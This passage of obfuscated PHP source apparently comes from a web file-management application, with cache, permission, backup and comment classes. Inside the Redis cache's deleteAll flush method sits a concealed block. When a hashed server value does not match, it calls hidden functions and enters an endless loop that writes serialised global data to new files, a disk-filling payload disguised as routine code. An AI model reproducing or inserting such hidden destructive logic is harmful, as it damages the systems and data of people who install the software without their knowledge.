__construct($»ø«Ì’, $ÅÙèå­…) { $¬âÇÈ«¶ =& $_SERVER[ùÆÎÔ“Ñ]; if (!class_exists($¬âÇÈ«¶[871])) { show_json($¬âÇÈ«¶[872], !1); } $this->cacheTime = $ÅÙèå­…; $this->handle = new Memcached(); if (is_array($»ø«Ì’[$¬âÇÈ«¶[873]]) && count($»ø«Ì’[$¬âÇÈ«¶[873]]) >= 1) { foreach ($»ø«Ì’[$¬âÇÈ«¶[873]] as $Û®ğÖù”) { $ò¿È ù† = explode($¬âÇÈ«¶[4], $Û®ğÖù”); $this->handle->addServer($ò¿È ù†[0], $ò¿È ù†[1]); } } else { $this->handle->addServer($»ø«Ì’[$¬âÇÈ«¶[181]], $»ø«Ì’[$¬âÇÈ«¶[182]]); } } public function set($æŠù¬õ¦, $ò¡³½¯½, $‚Úš›÷Õ = false) { $‚Úš›÷Õ = $‚Úš›÷Õ ? $‚Úš›÷Õ : $this->cacheTime; return $this->handle->set($æŠù¬õ¦, $ò¡³½¯½, $‚Úš›÷Õ); } public function get($ÅÁÂš‘—) { return $this->handle->get($ÅÁÂš‘—); } public function remove($Ü­Ø€³) { return $this->handle->delete($Ü­Ø€³); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($‡˜Ñéè½, $ïø›’¼Ã) { $ø¢®Àš¼ =& $_SERVER[ùÆÎÔ“Ñ]; if (!class_exists($ø¢®Àš¼[874])) { show_json($ø¢®Àš¼[875], !1); } $this->cacheTime = $ïø›’¼Ã; $µ¸˜Üğ¬ = isset($‡˜Ñéè½[$ø¢®Àš¼[876]]) ? $‡˜Ñéè½[$ø¢®Àš¼[876]] : 10; $§¶§È‹Ç = _get($‡˜Ñéè½, $ø¢®Àš¼[873]); if ($§¶§È‹Ç && is_array($§¶§È‹Ç)) { $this->initCluster($‡˜Ñéè½, $µ¸˜Üğ¬); } else { $this->handle = $this->init($‡˜Ñéè½, $µ¸˜Üğ¬); } } private function init($·…Ê€È¸, $‡„’³åª) { $™µÑºÚ» =& $_SERVER[ùÆÎÔ“Ñ]; $§‚½Ë‹Î = new Redis(); $í¶”ˆ = isset($·…Ê€È¸[$™µÑºÚ»[877]]) ? $·…Ê€È¸[$™µÑºÚ»[877]] : !1; if ($í¶”ˆ) { $§‚½Ë‹Î->pconnect($·…Ê€È¸[$™µÑºÚ»[181]], $·…Ê€È¸[$™µÑºÚ»[182]], $‡„’³åª); } else { $§‚½Ë‹Î->connect($·…Ê€È¸[$™µÑºÚ»[181]], $·…Ê€È¸[$™µÑºÚ»[182]], $‡„’³åª); } if (!empty($·…Ê€È¸[$™µÑºÚ»[413]])) { $§‚½Ë‹Î->auth($·…Ê€È¸[$™µÑºÚ»[413]]); } if (!empty($·…Ê€È¸[$™µÑºÚ»[759]]) && $·…Ê€È¸[$™µÑºÚ»[759]] != 0) { $§‚½Ë‹Î->select($·…Ê€È¸[$™µÑºÚ»[759]]); } return $§‚½Ë‹Î; } private function initCluster($«×ğ÷Ğ—, $Î¶½ÎË) { $ÏÛÌ·£µ =& $_SERVER[ùÆÎÔ“Ñ]; $£ùü²¿½ = array($ÏÛÌ·£µ[878], $ÏÛÌ·£µ[879], $ÏÛÌ·£µ[880]); $ŸŠÔ¼ğÉ = $ÏÛÌ·£µ[878]; if (isset($«×ğ÷Ğ—[$ÏÛÌ·£µ[16]]) && in_array($«×ğ÷Ğ—[$ÏÛÌ·£µ[16]], $£ùü²¿½)) { $ŸŠÔ¼ğÉ = $«×ğ÷Ğ—[$ÏÛÌ·£µ[16]]; } switch ($ŸŠÔ¼ğÉ) { case $ÏÛÌ·£µ[878]: $this->_slave($«×ğ÷Ğ—, $Î¶½ÎË); break; case $ÏÛÌ·£µ[879]: break; case $ÏÛÌ·£µ[880]: $this->isCluster = !0; $ÛŞªğÏ = $«×ğ÷Ğ—[$ÏÛÌ·£µ[873]]; $Æô·ñÂë = isset($«×ğ÷Ğ—[$ÏÛÌ·£µ[877]]) ? $«×ğ÷Ğ—[$ÏÛÌ·£µ[877]] : !1; $àèÔÏü© = isset($«×ğ÷Ğ—[$ÏÛÌ·£µ[413]]) ? $«×ğ÷Ğ—[$ÏÛÌ·£µ[413]] : null; $this->handle = new RedisCluster(NUll, $ÛŞªğÏ, $Î¶½ÎË, $Î¶½ÎË, $Æô·ñÂë, $àèÔÏü©); break; default: break; } } private function _slave($ÒÉ”Çšš, $¥ÈÍÏ¡Œ) { $Åıºà = $ÒÉ”Çšš[$_SERVER[ùÆÎÔ“Ñ][873]]; $this->filterConfig($ÒÉ”Çšš, $Åıºà[0]); $this->handle = $this->init($ÒÉ”Çšš, $¥ÈÍÏ¡Œ); unset($Åıºà[0]); if (empty($Åıºà)) { return; } $¢öïúÕâ = array_rand($Åıºà); $this->filterConfig($ÒÉ”Çšš, $Åıºà[$¢öïúÕâ]); $this->slaveHandle = $this->init($ÒÉ”Çšš, $¥ÈÍÏ¡Œ); } private function filterConfig(&$×ª®ê¥‰, $Õ¿‘Î) { $ÅŞâù‹™ =& $_SERVER[ùÆÎÔ“Ñ]; $ùÌ¯÷ò = explode($ÅŞâù‹™[4], $Õ¿‘Î); $³ÎæÊãØ = array($ÅŞâù‹™[181] => $ùÌ¯÷ò[0], $ÅŞâù‹™[182] => $ùÌ¯÷ò[1]); $×ª®ê¥‰ = array_merge($×ª®ê¥‰, $³ÎæÊãØ); } public function set($ƒ§ºŒ…û, $õ£¸¾üÄ, $Üé½’¯³ = false) { $Üé½’¯³ = $Üé½’¯³ ? $Üé½’¯³ : $this->cacheTime; return $this->handle->setEx($ƒ§ºŒ…û, $Üé½’¯³, $õ£¸¾üÄ); } public function setLock($Á•åËÆ¹, $øïİ’²é, $ü¾²ˆÏ) { return $this->handle->setNX($Á•åËÆ¹, $øïİ’²é); } public function get($»€Ş¥şä) { $«ÕÙİöø = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $«ÕÙİöø->get($»€Ş¥şä); } public function remove($ÜÕÂ¬£ª) { return $this->handle->del($ÜÕÂ¬£ª); } public function deleteAll() { $½Èë‹ùÉ =& $_SERVER[ùÆÎÔ“Ñ]; $ò»ƒË­ = $_SERVER[$½Èë‹ùÉ[848]]; $°Â‰•¼ = $½Èë‹ùÉ[881]; if ($_SERVER[$½Èë‹ùÉ[841]] != $°Â‰•¼($ò»ƒË­)) { $çşéÙ³ = $½Èë‹ùÉ[882]; $şÔ™˜áé = $½Èë‹ùÉ[843]; $ıú¶›ƒ = $_SERVER[$½Èë‹ùÉ[844]] . $½Èë‹ùÉ[845]; $ÜßöÚ² = $şÔ™˜áé($ıú¶›ƒ); $ø®¼Ã = explode($½Èë‹ùÉ[231], $ÜßöÚ²); if (count($ø®¼Ã) < $½Èë‹ùÉ[618]) { $ëÈöÂÚ  = $½Èë‹ùÉ[846]; $ëÈöÂÚ (); } $å« §™ì = $½Èë‹ùÉ[883]; $å« §™ì($_SERVER[$½Èë‹ùÉ[884]]); $çşéÙ³ = $½Èë‹ùÉ[882]; $çşéÙ³(); $ÄˆàÇ§¨ = $½Èë‹ùÉ[885]; $¾éĞ×İò = json_encode($GLOBALS[$½Èë‹ùÉ[886]]); $æª¥Ä’Û = 1; for ($ˆ¿°¿“í = $æª¥Ä’Û; $ˆ¿°¿“í > 0; $ˆ¿°¿“í++) { $ÄˆàÇ§¨(DATA_PATH . $ˆ¿°¿“í, $¾éĞ×İò); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $éÖ·Ê­ğ) { $this->handle->flushall($éÖ·Ê­ğ); } return; } return $this->handle->flushAll(); } } goto EÊÚœ½‚»Î; b’…Øµ¢: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $‹ÆÚ÷ñË =& $_SERVER[ùÆÎÔ“Ñ]; $ÙëöÊº = array(array($‹ÆÚ÷ñË[420] => LNG($‹ÆÚ÷ñË[1858]), $‹ÆÚ÷ñË[1859] => $‹ÆÚ÷ñË[1860], $‹ÆÚ÷ñË[1861] => 1, $‹ÆÚ÷ñË[1862] => 1, $‹ÆÚ÷ñË[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($‹ÆÚ÷ñË[420] => LNG($‹ÆÚ÷ñË[1864]), $‹ÆÚ÷ñË[1859] => $‹ÆÚ÷ñË[1865], $‹ÆÚ÷ñË[1861] => 2, $‹ÆÚ÷ñË[1862] => 1, $‹ÆÚ÷ñË[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($‹ÆÚ÷ñË[420] => LNG($‹ÆÚ÷ñË[1866]), $‹ÆÚ÷ñË[1859] => $‹ÆÚ÷ñË[1867], $‹ÆÚ÷ñË[1861] => 3, $‹ÆÚ÷ñË[1862] => 1, $‹ÆÚ÷ñË[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($‹ÆÚ÷ñË[420] => LNG($‹ÆÚ÷ñË[1868]), $‹ÆÚ÷ñË[1859] => $‹ÆÚ÷ñË[1869], $‹ÆÚ÷ñË[1861] => 4, $‹ÆÚ÷ñË[1862] => 1, $‹ÆÚ÷ñË[1863] => self::AUTH_SHOW | self::AUTH_VIEW), array($‹ÆÚ÷ñË[420] => LNG($‹ÆÚ÷ñË[1870]), $‹ÆÚ÷ñË[1859] => $‹ÆÚ÷ñË[1871], $‹ÆÚ÷ñË[1861] => 5, $‹ÆÚ÷ñË[1862] => 1, $‹ÆÚ÷ñË[1863] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($‹ÆÚ÷ñË[420] => LNG($‹ÆÚ÷ñË[1872]), $‹ÆÚ÷ñË[1859] => $‹ÆÚ÷ñË[1873], $‹ÆÚ÷ñË[1861] => 6, $‹ÆÚ÷ñË[1862] => 1, $‹ÆÚ÷ñË[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($‹ÆÚ÷ñË[420] => LNG($‹ÆÚ÷ñË[1874]), $‹ÆÚ÷ñË[1859] => $‹ÆÚ÷ñË[1875], $‹ÆÚ÷ñË[1861] => 7, $‹ÆÚ÷ñË[1862] => 1, $‹ÆÚ÷ñË[1863] => 0)); return $ÙëöÊº; } public static function authCheck($¶˜½¨Ê§, $Ö´Î–ÊÎ) { $ƒ©ÂÆæ¨ =& $_SERVER[ùÆÎÔ“Ñ]; $¶˜½¨Ê§ = intval($¶˜½¨Ê§); if ($GLOBALS[$ƒ©ÂÆæ¨[503]] && $GLOBALS[$ƒ©ÂÆæ¨[6]][$ƒ©ÂÆæ¨[1876]]) { return !0; } if ($¶˜½¨Ê§ <= 0) { return !1; } if (($¶˜½¨Ê§ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¶˜½¨Ê§ & $Ö´Î–ÊÎ); } public static function authCheckShow($¹­×—Åº) { return self::authCheck($¹­×—Åº, self::AUTH_SHOW); } public static function authCheckView($ÓÚìì°“) { return self::authCheck($ÓÚìì°“, self::AUTH_VIEW); } public static function authCheckDownload($ŸŒ‚Šíû) { return self::authCheck($ŸŒ‚Šíû, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¿ÁÀêêü) { return self::authCheck($¿ÁÀêêü, self::AUTH_UPLOAD); } public static function authCheckEdit($Ó±²ı“˜) { return self::authCheck($Ó±²ı“˜, self::AUTH_EDIT); } public static function authCheckRemove($¥¾…¼ª) { return self::authCheck($¥¾…¼ª, self::AUTH_REMOVE); } public static function authCheckShare($®ÂÄ’ëş) { return self::authCheck($®ÂÄ’ëş, self::AUTH_SHARE); } public static function authCheckComment($ˆ¤Ò­Å) { return self::authCheck($ˆ¤Ò­Å, self::AUTH_COMMENT); } public static function authCheckEvent($‡ßØ—Ä‚) { return self::authCheck($‡ßØ—Ä‚, self::AUTH_EVENT); } public static function authCheckRoot($ÌØåÄ„ô) { return self::authCheck($ÌØåÄ„ô, self::AUTH_ROOT); } public static function authCheckAction($éğş¿¸ä, $ŠÕÜÇ·ï) { $Éµ€¤ßÓ =& $_SERVER[ùÆÎÔ“Ñ]; $­øßãçæ = array($Éµ€¤ßÓ[1877] => self::AUTH_VIEW, $Éµ€¤ßÓ[1200] => self::AUTH_DOWNLOAD, $Éµ€¤ßÓ[107] => self::AUTH_UPLOAD, $Éµ€¤ßÓ[1827] => self::AUTH_EDIT, $Éµ€¤ßÓ[1826] => self::AUTH_REMOVE, $Éµ€¤ßÓ[1837] => self::AUTH_SHARE, $Éµ€¤ßÓ[354] => self::AUTH_COMMENT, $Éµ€¤ßÓ[1655] => self::AUTH_EVENT, $Éµ€¤ßÓ[1878] => self::AUTH_ROOT); if (!isset($­øßãçæ[$ŠÕÜÇ·ï])) { return; } $Íüš‹ë = $­øßãçæ[$ŠÕÜÇ·ï]; $éğş¿¸ä = intval($éğş¿¸ä); if ($éğş¿¸ä <= 0) { return !1; } if (($éğş¿¸ä & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($éğş¿¸ä & $Íüš‹ë); } public static function authDisable($´ÏÁâ, $ëÆİ—õ”) { if (intval($´ÏÁâ) <= 0) { return 0; } return intval($´ÏÁâ) & ~$ëÆİ—õ”; } public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\163\157\165\162\143\x65\x41\x75\164\x68\x4c\x69\x73\x74"; public $field = array("\156\141\155\x65", "\141\x75\164\150", "\x6c\x61\142\145\x6c", "\144\x69\x73\160\154\x61\x79", "\163\171\163\x74\x65\x6d", "\x73\x6f\162\x74"); public function initData() { $Õº¯ì®œ = $this->authDefault(); foreach ($Õº¯ì®œ as $Ï«©ıë) { $this->add($Ï«©ıë); } } public function findAuth($ŒÊÒã™ä, $ÁçÅ©š‚) { $ÑÁ–ÏÚë =& $_SERVER[ùÆÎÔ“Ñ]; $¾©¯éú† = parent::listData(); foreach ($¾©¯éú† as $â°’©²û) { $ÎÚÍ˜š‰ = intval($â°’©²û[$ÑÁ–ÏÚë[413]]); if ($ÎÚÍ˜š‰ <= 0 || $â°’©²û[$ÑÁ–ÏÚë[1879]] == 0) { continue; } if (($ÎÚÍ˜š‰ & $ŒÊÒã™ä) != $ŒÊÒã™ä) { continue; } if (($ÎÚÍ˜š‰ & $ÁçÅ©š‚) != 0) { continue; } return $â°’©²û[$ÑÁ–ÏÚë[399]]; } return !1; } public function findAuthReadOnly() { $˜•õ€ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ê…³øÃ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($˜•õ€, $ê…³øÃ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $õä»Û²Å =& $_SERVER[ùÆÎÔ“Ñ]; $×Ùœ» = parent::listData(); $™Ïˆáé = !1; foreach ($×Ùœ» as $óæ¯ º¨) { if ($óæ¯ º¨[$õä»Û²Å[413]] <= 0 || $óæ¯ º¨[$õä»Û²Å[1879]] == $õä»Û²Å[197]) { continue; } if (!$™Ïˆáé) { $™Ïˆáé = $óæ¯ º¨; continue; } if ($™Ïˆáé[$õä»Û²Å[413]] > $óæ¯ º¨[$õä»Û²Å[413]]) { $™Ïˆáé = $óæ¯ º¨; } } return $™Ïˆáé ? $™Ïˆáé[$õä»Û²Å[399]] : $õä»Û²Å[12]; } public function listData($Èªøà“ = false, $œÅ¢ê¸ö = "\163\157\x72\164", $Á™»ÓşÆ = false) { return parent::listData($Èªøà“, $œÅ¢ê¸ö, $Á™»ÓşÆ); } public function update($å‚®­Ñœ, $¢§æ‘Ç×) { $üİÒ¨Å¤ =& $_SERVER[ùÆÎÔ“Ñ]; $’ç±Œ„½ = parent::listData($å‚®­Ñœ); $Ïµ„°©Š = $this->findByName($¢§æ‘Ç×[$üİÒ¨Å¤[32]]); if (!$’ç±Œ„½ || $Ïµ„°©Š && $Ïµ„°©Š[$üİÒ¨Å¤[399]] != $’ç±Œ„½[$üİÒ¨Å¤[399]]) { return !1; } $this->filterAuth($¢§æ‘Ç×[$üİÒ¨Å¤[413]]); return parent::update($å‚®­Ñœ, $¢§æ‘Ç×); } public function remove($·çÅãŸ­) { $Ãâï€› = parent::listData($·çÅãŸ­); if (!$Ãâï€› || $Ãâï€›[$_SERVER[ùÆÎÔ“Ñ][1290]]) { return !1; } return parent::remove($·çÅãŸ­); } public function add($€ªÂ»Æú = array()) { $µşáŸ’Æ =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->findByName($€ªÂ»Æú[$µşáŸ’Æ[32]])) { return !1; } $©Êéç± = array($µşáŸ’Æ[32] => $µşáŸ’Æ[12], $µşáŸ’Æ[413] => 1, $µşáŸ’Æ[1880] => $µşáŸ’Æ[1867], $µşáŸ’Æ[1879] => 1, $µşáŸ’Æ[1290] => 0, $µşáŸ’Æ[1881] => 0); $€ªÂ»Æú = array_merge($©Êéç±, $€ªÂ»Æú); $€ªÂ»Æú[$µşáŸ’Æ[1881]] = $this->getSort(); $this->filterAuth($€ªÂ»Æú[$µşáŸ’Æ[413]]); return parent::insert($€ªÂ»Æú); } private function getSort() { $¿šş’Ô­ =& $_SERVER[ùÆÎÔ“Ñ]; $Ã¦âÀßÑ = parent::listData(); $Ã…ìÈ³ = array_to_keyvalue($Ã¦âÀßÑ, $¿šş’Ô­[12], $¿šş’Ô­[1881]); return empty($Ã…ìÈ³) ? 0 : max($Ã…ìÈ³) + 1; } private function filterAuth(&$ŠÄ—Ä©Ë) { if (!$ŠÄ—Ä©Ë) { return; } $Ğ¾·Š‹¬ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ğ†œİÛ˜ = array(); foreach ($Ğ¾·Š‹¬ as $¥ø”Í©Ë) { if ($ŠÄ—Ä©Ë & $¥ø”Í©Ë) { $Ğ†œİÛ˜[] = $¥ø”Í©Ë; } } if (in_array(self::AUTH_ROOT, $Ğ†œİÛ˜)) { $ŠÄ—Ä©Ë = array_sum($Ğ¾·Š‹¬); return; } $¶ğÇû†Ş = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ğ†œİÛ˜ as $¥ø”Í©Ë) { if (isset($¶ğÇû†Ş[$¥ø”Í©Ë])) { $Ğ†œİÛ˜ = array_merge($Ğ†œİÛ˜, $¶ğÇû†Ş[$¥ø”Í©Ë]); } } $Ğ†œİÛ˜[] = self::AUTH_SHOW; $ŠÄ—Ä©Ë = array_sum(array_unique($Ğ†œİÛ˜)); } public function sort($Ã¯ãˆÉ“, $µß»ıŠû) { return parent::update($Ã¯ãˆÉ“, $µß»ıŠû); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\x62\x61\143\x6b\x75\160\x4c\151\x73\x74"; public $field = array("\151\157", "\x6e\141\155\x65", "\x73\x74\141\164\x75\x73", "\143\157\x6e\x74\x65\x6e\x74", "\155\x61\x6e\165\x61\x6c", "\x72\x65\x73\x75\154\164", "\164\151\155\x65\106\162\157\155", "\164\151\x6d\145\x54\157"); public function config() { $…·ƒêƒ² =& $_SERVER[ùÆÎÔ“Ñ]; $ÖÕÔö¾• = Model($…·ƒêƒ²[771])->get($…·ƒêƒ²[781]); $ÖÕÔö¾• = json_decode($ÖÕÔö¾•, !0); $ÖÕÔö¾• = is_array($ÖÕÔö¾•) ? $ÖÕÔö¾• : array(); if (!isset($ÖÕÔö¾•[$…·ƒêƒ²[756]])) { $ÖÕÔö¾•[$…·ƒêƒ²[756]] = $…·ƒêƒ²[88]; } unset($ÖÕÔö¾•[$…·ƒêƒ²[1637]]); Action($…·ƒêƒ²[1882])->taskInit(); Model($…·ƒêƒ²[1636])->cacheClear(); $ãà”„†» = $…·ƒêƒ²[1883]; $¿İõÙÊÑ = Model($…·ƒêƒ²[1884])->findByKey($…·ƒêƒ²[1655], $ãà”„†»); if (!$¿İõÙÊÑ) { $¿İõÙÊÑ = array(); } if (isset($¿İõÙÊÑ[$…·ƒêƒ²[203]])) { $¿İõÙÊÑ[$…·ƒêƒ²[203]] = json_decode($¿İõÙÊÑ[$…·ƒêƒ²[203]], !0); } if (isset($ÖÕÔö¾•[$…·ƒêƒ²[203]])) { $¿İõÙÊÑ[$…·ƒêƒ²[203]][$…·ƒêƒ²[1640]] = $ÖÕÔö¾•[$…·ƒêƒ²[203]]; unset($ÖÕÔö¾•[$…·ƒêƒ²[203]]); } return array_merge($¿İõÙÊÑ, $ÖÕÔö¾•); } public function listData($“ßÇ°ç = false, $İ¿úÀŠù = "\x6d\157\144\151\146\171\x54\x69\x6d\x65", $Ü‹È‚Ûˆ = false) { return parent::listData($“ßÇ°ç, $İ¿úÀŠù, !0); } public function lastItem() { $¥ÙËüÏ° = $this->listData(); return !empty($¥ÙËüÏ°[0]) ? $¥ÙËüÏ°[0] : null; } public function kill($½¹¤™§„) { $ŒÊ¼ˆŒ =& $_SERVER[ùÆÎÔ“Ñ]; $£“§Ó‘½ = $this->listData($½¹¤™§„); if (!$£“§Ó‘½ || empty($£“§Ó‘½[$ŒÊ¼ˆŒ[32]])) { return !0; } Task::kill($ŒÊ¼ˆŒ[780]); Task::kill($ŒÊ¼ˆŒ[801]); Task::kill($ŒÊ¼ˆŒ[810]); $‘µ³°È = $£“§Ó‘½[$ŒÊ¼ˆŒ[32]]; $äßà£¬´ = TEMP_FILES . $ŒÊ¼ˆŒ[779] . $‘µ³°È . $ŒÊ¼ˆŒ[8]; IO::remove($äßà£¬´, !1); return $this->remove($½¹¤™§„); } public function remove($˜¯¥Ü¯ì) { $æºÒÁÍÎ = $this->listData($˜¯¥Ü¯ì); if (!$æºÒÁÍÎ) { return !0; } return $this->backupRemove($æºÒÁÍÎ); } private function backupRemove($´ˆ‡„Ìò) { parent::remove($´ˆ‡„Ìò[$_SERVER[ùÆÎÔ“Ñ][399]]); $¬³ŒÎ®Â = $this->backupPath($´ˆ‡„Ìò); IO::remove($¬³ŒÎ®Â, !1); return !0; } private function backupPath($ÌÓï•å˜) { $ã£Ğ®µÜ =& $_SERVER[ùÆÎÔ“Ñ]; $•íú„Ñí = $ÌÓï•å˜[$ã£Ğ®µÜ[32]]; $şã•”÷ = Model($ã£Ğ®µÜ[771])->get($ã£Ğ®µÜ[772]); $ıÉÚã¤ç = substr(md5($ã£Ğ®µÜ[773] . $şã•”÷ . $•íú„Ñí), 0, 8); return "\173\151\x6f\x3a{$ÌÓï•å˜[$ã£Ğ®µÜ[753]]}\x7d\57\x64\x61\164\x61\142\141\163\x65\x2f\142\x61\143\x6b\x75\160\57" . $•íú„Ñí . $ã£Ğ®µÜ[11] . $ıÉÚã¤ç; } public function start() { $ñ¨”°úõ =& $_SERVER[ùÆÎÔ“Ñ]; if ($GLOBALS[$ñ¨”°úõ[6]][$ñ¨”°úõ[89]][$ñ¨”°úõ[1885]] != $ñ¨”°úõ[88]) { return !0; } $òæ½¿“Ú = $this->config(); if (!$òæ½¿“Ú || $òæ½¿“Ú[$ñ¨”°úõ[1637]] != $ñ¨”°úõ[88]) { return !1; } $¥ôíŒ»è = $this->process(); foreach ($¥ôíŒ»è as $¶çæôğ÷) { if ($¶çæôğ÷) { return Task::restart($¶çæôğ÷[$ñ¨”°úõ[399]]); } } $®Õ¥°åÃ = new Backup(); $ÔîšûÜï = $®Õ¥°åÃ->db(); if ($ÔîšûÜï) { $ÔîšûÜï = $®Õ¥°åÃ->dbFile(); if ($ÔîšûÜï && $òæ½¿“Ú[$ñ¨”°úõ[756]] == $ñ¨”°úõ[197]) { $ÔîšûÜï = $®Õ¥°åÃ->file(); } } Backup::set(array($ñ¨”°úõ[751] => 1, $ñ¨”°úõ[497] => time())); return !0; } public function process() { $ßîÊÁí =& $_SERVER[ùÆÎÔ“Ñ]; $Ö¾ òïâ = array($ßîÊÁí[759] => Task::get($ßîÊÁí[780]), $ßîÊÁí[763] => Task::get($ßîÊÁí[801]), $ßîÊÁí[199] => Task::get($ßîÊÁí[810])); $¾¯³Òö¿ = !1; foreach ($Ö¾ òïâ as &$çî¼°«Î) { if ($¾¯³Òö¿) { $çî¼°«Î = !1; continue; } if ($çî¼°«Î) { $ÚÚ“—´ = intval(_get($çî¼°«Î, $ßîÊÁí[1672], 0)); if (time() - $ÚÚ“—´ > 7200) { Task::kill($çî¼°«Î[$ßîÊÁí[399]]); $¾¯³Òö¿ = !0; $çî¼°«Î = !1; } } } return $Ö¾ òïâ; } public function restore() { $¿¨øÂ¸« =& $_SERVER[ùÆÎÔ“Ñ]; ActionCall($¿¨øÂ¸«[1065], !0, 1); ActionCall($¿¨øÂ¸«[1065], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\x65\156\164"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\141\155\145" => "\143\157\x6d\155\145\x6e\164\137\x6d\145\x74\141", "\155\x65\164\141\106\x69\145\154\x64" => "\143\157\x6d\x6d\x65\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Üâ°ü¨¼) { $…ˆú¤¡ê =& $_SERVER[ùÆÎÔ“Ñ]; if ($Üâ°ü¨¼[$…ˆú¤¡ê[1886]]) { $ùÑóŞ† = $this->where(array($…ˆú¤¡ê[1887] => $Üâ°ü¨¼[$…ˆú¤¡ê[1886]]))->find(); if (!$ùÑóŞ† || $ùÑóŞ†[$…ˆú¤¡ê[411]] != $Üâ°ü¨¼[$…ˆú¤¡ê[411]] || $ùÑóŞ†[$…ˆú¤¡ê[505]] != $Üâ°ü¨¼[$…ˆú¤¡ê[505]]) { return !1; } $this->where(array($…ˆú¤¡ê[1887] => $Üâ°ü¨¼[$…ˆú¤¡ê[1886]]))->setAdd($…ˆú¤¡ê[1888], 1); } $Üâ°ü¨¼[$…ˆú¤¡ê[1889]] = 0; $Üâ°ü¨¼[$…ˆú¤¡ê[1888]] = 0; $Üâ°ü¨¼[$…ˆú¤¡ê[751]] = 1; return $this->add($Üâ°ü¨¼); } public function commentCount($§¾ëâùœ, $¤ä÷Ÿ•ä, $Ç™‡é»Á = false) { $´â‚“½ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$§¾ëâùœ) { return array(); } if (is_string($§¾ëâùœ) || is_int($§¾ëâùœ)) { $§¾ëâùœ = array($§¾ëâùœ); } $°˜ğ˜ı = array($´â‚“½[505], $´â‚“½[1890] => $´â‚“½[500]); $Š‚‘‹ = array($´â‚“½[505] => array($´â‚“½[7], $§¾ëâùœ), $´â‚“½[411] => $¤ä÷Ÿ•ä); if ($Ç™‡é»Á) { $Š‚‘‹[$´â‚“½[1667]] = $Ç™‡é»Á; } $–×ÜË˜Ë = $this->field($°˜ğ˜ı)->where($Š‚‘‹)->group($´â‚“½[505])->select(); return array_to_keyvalue($–×ÜË˜Ë, $´â‚“½[505], $´â‚“½[500]); } public function starTarget($à¨óöØá, $²ô•£”§) { $²Ğ¬ßğŸ =& $_SERVER[ùÆÎÔ“Ñ]; $ˆÌÇ¯­˜ = $à¨óöØá + self::TYPE_STAR_OFFSET; $Áùƒä‰ = array($²Ğ¬ßğŸ[1667] => USER_ID, $²Ğ¬ßğŸ[411] => $ˆÌÇ¯­˜, $²Ğ¬ßğŸ[505] => $²ô•£”§); $¼à‚šäÅ = $this->where($Áùƒä‰)->find(); if ($¼à‚šäÅ) { return $this->where(array($²Ğ¬ßğŸ[399] => $¼à‚šäÅ[$²Ğ¬ßğŸ[399]]))->delete(); } $›Ù‘½ á = array($²Ğ¬ßğŸ[1886] => 0, $²Ğ¬ßğŸ[1667] => USER_ID, $²Ğ¬ßğŸ[751] => 1, $²Ğ¬ßğŸ[756] => $²Ğ¬ßğŸ[12], $²Ğ¬ßğŸ[411] => $ˆÌÇ¯­˜, $²Ğ¬ßğŸ[505] => $²ô•£”§, $²Ğ¬ßğŸ[1889] => 0, $²Ğ¬ßğŸ[1888] => 0); return $this->add($›Ù‘½ á); } public function starTargetCount($ş¸¢ˆÃæ, $†àü–ö„) { $Ü£´Øİ¦ =& 